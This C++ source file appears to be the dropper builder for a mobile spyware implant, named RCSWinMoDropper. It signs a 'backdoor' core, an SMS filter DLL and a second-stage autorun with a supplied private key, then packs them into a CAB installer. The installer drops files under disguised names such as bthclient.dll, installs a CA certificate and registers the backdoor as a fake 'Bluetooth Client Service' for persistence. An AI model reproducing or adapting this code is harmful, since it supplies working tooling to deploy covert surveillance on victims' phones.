
#include "stdafx.h"
#include <Windows.h>
#include "dropper.h"

extern BOOL SignMobileComponent(TCHAR *wsFile, TCHAR *wsCert);

int _tmain(int argc, _TCHAR* argv[])
{
	HANDLE hFile;
	BYTE *pBlockPtr	= NULL;
	WCHAR wsCoreFile[MAX_PATH];
	WCHAR wsSmsFile[MAX_PATH];
	WCHAR wsSecondFile[MAX_PATH];
	WCHAR wsConfigFile[MAX_PATH];
	WCHAR wsCertFile[MAX_PATH];
	WCHAR wsPFXFile[MAX_PATH];
	WCHAR wsOutFile[MAX_PATH];
	unsigned int iLen = 0;

	if (argc != 8) {
		printf("ERROR: \n");
		printf("  usage:  RCSWinMoDropper.exe  <core> <smsfilter> <secondstage> <config> <cert> <pfx> <output>\n\n");
		printf("  <core> is the backdoor signed core\n");
		printf("  <smsfilter> is the smsfilter dll\n");
		printf("  <secondstage> is the second stage autorun\n");
		printf("  <config> is the backdoor encrypted configuration\n");
		printf("  <cert> is the CA cert to be dropped\n");
		printf("  <pfx> is the private key for the signing process\n");
		printf("  <output> is the output file\n\n");
		return 0;
	}

	wsprintf(wsCoreFile, L"%s", argv[1]);
	wsprintf(wsSmsFile, L"%s", argv[2]);
	wsprintf(wsSecondFile, L"%s", argv[3]);
	wsprintf(wsConfigFile, L"%s", argv[4]);
	wsprintf(wsCertFile, L"%s", argv[5]);
	wsprintf(wsPFXFile, L"%s", argv[6]);
	wsprintf(wsOutFile, L"%s", argv[7]);

	/************************************************************************/
	/*  SANITY CHECKS                                                       */
	/************************************************************************/

	if ( (hFile = CreateFile(wsCoreFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find Core file [%S]\n", wsCoreFile);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}

	if ( (hFile = CreateFile(wsSmsFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find SMS filter file [%S]\n", wsSmsFile);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}

	if ( (hFile = CreateFile(wsSecondFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find Second Stage file [%S]\n", wsSecondFile);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}

	if ( (hFile = CreateFile(wsConfigFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find Config file [%S]\n", wsConfigFile);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}

	if ( (hFile = CreateFile(wsCertFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find Cert file [%S]\n", wsCertFile);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}

	if ( (hFile = CreateFile(wsPFXFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find PFX file [%S]\n", wsPFXFile);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}

	/************************************************************************/
	/*  READY TO GO                                                         */
	/************************************************************************/

	printf("Ready to go...\n");
	printf("CORE          [%S]\n", wsCoreFile);
	printf("SMSFILTER     [%S]\n", wsSmsFile);
	printf("SECOND STAGE  [%S]\n", wsSecondFile);
	printf("CONFIG        [%S]\n", wsConfigFile);
	printf("CERT FILE     [%S]\n", wsCertFile);
	printf("OUTPUT        [%S]\n\n", wsOutFile);

	/************************************************************************/
	/* SIGNING                                                              */
	/************************************************************************/

	WCHAR wsDropPath[MAX_PATH];

	if (SignMobileComponent(wsSmsFile, wsPFXFile)) {
		printf("Using PFX to sign SMS filter... ok\n");
	} else {
		printf("Cannot sign with PFX file [%S]\n", wsPFXFile);
		return ERROR_EMBEDDING;
	}

	if (SignMobileComponent(wsSecondFile, wsPFXFile)) {
		printf("Using PFX to sign Second Stage... ok\n");
	} else {
		printf("Cannot sign with PFX file [%S]\n", wsPFXFile);
		return ERROR_EMBEDDING;
	}

	/************************************************************************/
	/* CAB GENERATION                                                       */
	/************************************************************************/

	wsprintf(wsDropPath, L"%%Windows%%\\autorun2.exe");

	if (AddFile(wsDropPath, wsSecondFile)) {
		printf("Adding Second Stage to cab... ok\n");
	} else {
		printf("Cannot add Second Stage to cab [%S]\n", wsSecondFile);
		return ERROR_EMBEDDING;
	}

	wsprintf(wsDropPath, L"%%Windows%%\\bthclient.dll");
	
	if (AddFile(wsDropPath, wsCoreFile)) {
		printf("Adding Core to cab... ok\n");
	} else {
		printf("Cannot add Core to cab [%S]\n", wsCoreFile);
		return ERROR_EMBEDDING;
	}
	
	wsprintf(wsDropPath, L"%%Windows%%\\SmsFilter.dll");

	if (AddFile(wsDropPath, wsSmsFile)) {
		printf("Adding SMS filter to cab... ok\n");
	} else {
		printf("Cannot add SMS filter to cab [%S]\n", wsSmsFile);
		return ERROR_EMBEDDING;
	}

	wsprintf(wsDropPath, L"%%Windows%%\\$MS313Mobile\\%s", wsConfigFile);

	if (AddFile(wsDropPath, wsConfigFile)) {
		printf("Adding Config to cab... ok\n");
	} else {
		printf("Cannot add Config to cab [%S]\n", wsConfigFile);
		return ERROR_EMBEDDING;
	}

	wsprintf(wsDropPath, L"cert.cer");

	if (AddFile(wsDropPath, wsCertFile)) {
		printf("Adding Cert to cab... ok\n");
	} else {
		printf("Cannot add Cert to cab [%S]\n", wsCertFile);
		return ERROR_EMBEDDING;
	}

	WCHAR wsKeyPath[MAX_PATH];
	WCHAR wsDLL[MAX_PATH];
	WCHAR *wsCore;
	BOOL ret = TRUE;

	if ((wsCore = wcschr(wsCoreFile, L'.' )) != NULL)
		*wsCore = 0;

	if ((wsCore = wcsrchr(wsCoreFile, L'\\' )) == NULL) {
		wsCore = wsCoreFile;
	}

	// Add reg key to cabinet
	wsprintf(wsKeyPath, L"Services\\%s", wsCore);
	ret &= AddRegistryKey(HKEY_LOCAL_MACHINE, wsKeyPath);

	wsprintf(wsKeyPath, L"Services\\%s\\FriendlyName", wsCore);
	ret &= AddRegistryValue(HKEY_LOCAL_MACHINE, wsKeyPath, typeWString, (LPVOID)L"Bluetooth Client", 0);

	wsprintf(wsKeyPath, L"Services\\%s\\Dll", wsCore);
	wsprintf(wsDLL, L"%s.dll", wsCore);
	ret &= AddRegistryValue(HKEY_LOCAL_MACHINE, wsKeyPath, typeWString, (LPVOID)wsDLL, 0);

	wsprintf(wsKeyPath, L"Services\\%s\\Order", wsCore);
	ret &= AddRegistryValue(HKEY_LOCAL_MACHINE, wsKeyPath, typeDword, (LPVOID)9, 0);

	wsprintf(wsKeyPath, L"Services\\%s\\Index", wsCore);
	ret &= AddRegistryValue(HKEY_LOCAL_MACHINE, wsKeyPath, typeDword, (LPVOID)0, 0);

	wsprintf(wsKeyPath, L"Services\\%s\\Keep", wsCore);
	ret &= AddRegistryValue(HKEY_LOCAL_MACHINE, wsKeyPath, typeDword, (LPVOID)1, 0);

	wsprintf(wsKeyPath, L"Services\\%s\\Prefix", wsCore);
	ret &= AddRegistryValue(HKEY_LOCAL_MACHINE, wsKeyPath, typeWString, (LPVOID)L"BTC", 0);

	wsprintf(wsKeyPath, L"Services\\%s\\Description", wsCore);
	ret &= AddRegistryValue(HKEY_LOCAL_MACHINE, wsKeyPath, typeWString, (LPVOID)L"Bluetooth Client Service", 0);

	ret &= RegService(L"BTC", wsCore, 0);

	if (!ret) {
		printf("Cannot write registry informations\n");
		return ERROR_EMBEDDING;
	}

	if (CreateArchive(wsOutFile)) {
		printf("Output file... ok\n");
	} else {
		printf("Cannot create output file [%S]\n", wsOutFile);
		DeleteFile(wsOutFile);
		return ERROR_EMBEDDING;
	}

	return ERROR_SUCCESS;
}

